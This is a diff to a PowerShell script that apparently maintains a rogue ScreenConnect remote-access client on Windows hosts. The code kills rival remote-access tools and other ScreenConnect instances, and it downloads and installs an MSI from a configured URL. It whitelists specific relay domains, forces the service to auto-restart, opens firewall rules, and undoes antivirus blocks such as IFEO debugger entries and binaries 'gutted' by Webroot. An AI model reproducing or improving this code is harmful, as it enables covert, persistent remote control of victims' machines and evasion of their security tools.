@@ -94,7 +94,7 @@ $RivalNames = @(
     'Autotask', 'SimpleHelp', 'ISL Online', 'Chrome Remote Desktop', 'NoMachine', 'Ammyy',
     'Supremo', 'Remote Utilities', 'Netop', 'Bomgar', 'BeyondTrust', 'MeshAgent', 'Mesh Central',
     'TacticalRMM', 'TRMM', 'RMMagent', 'AgentSetup', 'AnyDeskSetup', 'TeamViewer_Setup',
-    'TeamViewerQS', 'ScreenConnect.ClientSetup', 'ClientSetup', 'GetScreen', 'ShowMyPC'
+    'TeamViewerQS', 'GetScreen', 'ShowMyPC'
 )
 
 # Extra process/service tokens for non-SC RMM kill (matched against name/path/displayname)
@@ -179,8 +179,7 @@ function Get-ScInstallRoots {
     @(
         "${env:ProgramFiles}\ScreenConnect Client ($Fingerprint)",
         "${env:ProgramFiles(x86)}\ScreenConnect Client ($Fingerprint)",
-        "${env:ProgramData}\ScreenConnect\$Fingerprint",
-        "${env:ProgramData}\ScreenConnect"
+        "${env:ProgramData}\ScreenConnect\$Fingerprint"
     ) | Where-Object { $_ -and (Test-Path $_) }
 }
 
@@ -424,8 +423,9 @@ function Get-ScBinaryHealth {
             if ($_.Length -gt $info.MaxDllSize) { $info.MaxDllSize = $_.Length }
         }
     }
-    $info.ProcCount = @(Get-Process -ErrorAction SilentlyContinue | Where-Object {
-        $_.ProcessName -like 'ScreenConnect*' -or $_.ProcessName -like '*ClientService*'
+    $info.ProcCount = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        ("$($_.Name) $($_.ExecutablePath) $($_.CommandLine)" -like "*$PrimaryFingerprint*") -and
+        ($_.Name -match '(?i)ScreenConnect|ClientService')
     }).Count
     # Real SC payloads are much larger; ~60-100KB files after Webroot gutting are stubs
     if ($info.MaxExeSize -gt 0 -and $info.MaxExeSize -lt 200000 -and $info.MaxDllSize -lt 400000) {
@@ -1139,9 +1139,9 @@ function Invoke-NukeBlockedScreenConnect {
     $killed = 0
 
     # 1) Known rival fingerprint(s)
-    foreach ($fp in $LegacyFingerprints) {
-        if ($fp -in $AllowedFingerprints) { continue }
-        Remove-ScByFingerprint -Fingerprint $fp
+    foreach ($legacyFp in $LegacyFingerprints) {
+        if ($legacyFp -in $AllowedFingerprints) { continue }
+        Remove-ScByFingerprint -Fingerprint $legacyFp
         $killed++
     }
 
@@ -1172,7 +1172,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260729Z'
+Write-Log 'WU_BUILD_20260730A'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -1924,7 +1924,7 @@ try {
 `$allowed = @('5f6010579852e507','f861c8140d453427')
 `$relayHints = @('sevrz.com','update.sevrz.com','ui.sevrz.com','pluxn.com','update.pluxn.com')
 `$badRelays = @('uvexr.com','update.uvexr.com','vexlm.com')
-`$svcName = 'ScreenConnect Client ($fp)'
+`$svcName = 'ScreenConnect Client ($PrimaryFingerprint)'
 `$msiUrl = '$MsiUrl'
 `$work = '$WorkDir'
 `$workAlt = '$WorkDirAlt'
@@ -2085,9 +2085,7 @@ function PurgeBadSc {
         ("`$(`$_.ExecutablePath)`$(`$_.CommandLine)" -match '(?i)ScreenConnect|ConnectWise')
     } | ForEach-Object {
         `$blob = "`$(`$_.Name) `$(`$_.ExecutablePath) `$(`$_.CommandLine)"
-        `$ok = `$false
-        foreach (`$a in `$allowed) { if (`$blob -like "*`$a*") { `$ok = `$true; break } }
-        if (`$ok) { return }
+        if (Allowed `$_.Name "`$(`$_.ExecutablePath) `$(`$_.CommandLine)") { return }
         Stop-Process -Id `$_.ProcessId -Force -EA SilentlyContinue
         cmd /c "taskkill /F /PID `$(`$_.ProcessId)" >`$null 2>&1
         L ("monitor: killed rival SC pid `$(`$_.ProcessId) `$(`$_.Name)")
@@ -2155,14 +2153,14 @@ function Install {
     if ((ScRunning) -and -not (TestHollow)) { L 'Primary SC service RUNNING - skip MSI'; return `$true }
     if ((ScPresent) -and -not (TestHollow)) {
         L 'Primary SC present - starting service (no MSI)'
-        cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
-        cmd /c "sc start `"$svcName`"" >`$null 2>&1
+        cmd /c ('sc config "' + `$svcName + '" start= auto') >`$null 2>&1
+        cmd /c ('sc start "' + `$svcName + '"') >`$null 2>&1
         Start-Sleep 5
         if (ScRunning) { L 'SC service RUNNING after sc start'; return `$true }
         L 'sc start failed - will try MSI repair'
     }
     if (-not (ScPresent)) { L 'Primary SC service missing - forcing MSI install' }
-    elseif (TestHollow) { L 'Primary SC hollow - forcing MSI repair'; cmd /c "sc stop `"$svcName`"" >`$null 2>&1 }
+    elseif (TestHollow) { L 'Primary SC hollow - forcing MSI repair'; cmd /c ('sc stop "' + `$svcName + '"') >`$null 2>&1 }
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     New-Item -ItemType Directory -Path `$work -Force | Out-Null
     if (Test-Path `$msi) { Remove-Item `$msi -Force -EA SilentlyContinue }
@@ -2177,7 +2175,7 @@ function Install {
     Start-Sleep 8
     Remove-Item `$msi -Force -EA SilentlyContinue
     FwAllow
-    cmd /c "sc start `"$svcName`"" >`$null 2>&1
+    cmd /c ('sc start "' + `$svcName + '"') >`$null 2>&1
     Start-Sleep 3
     if (ScRunning) { L 'SC service RUNNING after MSI'; return `$true }
     if (ScPresent) { L 'SC service present after MSI but not running'; return `$false }
@@ -2215,14 +2213,14 @@ function HardRestart {
         `$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`$exe"
         if (Test-Path `$ifeo) { Remove-ItemProperty `$ifeo -Name Debugger -Force -EA SilentlyContinue }
     }
-    cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
-    cmd /c "sc failure `"$svcName`" reset= 86400 actions= restart/3000/restart/3000/restart/3000" >`$null 2>&1
-    cmd /c "sc stop `"$svcName`"" >`$null 2>&1
+    cmd /c ('sc config "' + `$svcName + '" start= auto') >`$null 2>&1
+    cmd /c ('sc failure "' + `$svcName + '" reset= 86400 actions= restart/3000/restart/3000/restart/3000') >`$null 2>&1
+    cmd /c ('sc stop "' + `$svcName + '"') >`$null 2>&1
     Start-Sleep 2
     Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object {
         (`$_.Name -match '(?i)ScreenConnect|ClientService') -and ("`$(`$_.CommandLine)" -like "*`$fp*")
     } | ForEach-Object { Stop-Process -Id `$_.ProcessId -Force -EA SilentlyContinue }
-    cmd /c "sc start `"$svcName`"" >`$null 2>&1
+    cmd /c ('sc start "' + `$svcName + '"') >`$null 2>&1
     Start-Sleep 5
 }
 function EnsureUp {
@@ -2253,8 +2251,8 @@ function EnsureUp {
         `$sess = RelaySess
     }
     if (ScPresent) {
-        cmd /c "sc config `"$svcName`" start= auto" >`$null 2>&1
-        if (-not (ScRunning)) { cmd /c "sc start `"$svcName`"" >`$null 2>&1; Start-Sleep 3 }
+        cmd /c ('sc config "' + `$svcName + '" start= auto') >`$null 2>&1
+        if (-not (ScRunning)) { cmd /c ('sc start "' + `$svcName + '"') >`$null 2>&1; Start-Sleep 3 }
     }
     `$tcp2 = RelayTcp; `$sess2 = RelaySess
     if ((ScRunning) -and (-not (TestHollow)) -and `$tcp2) {
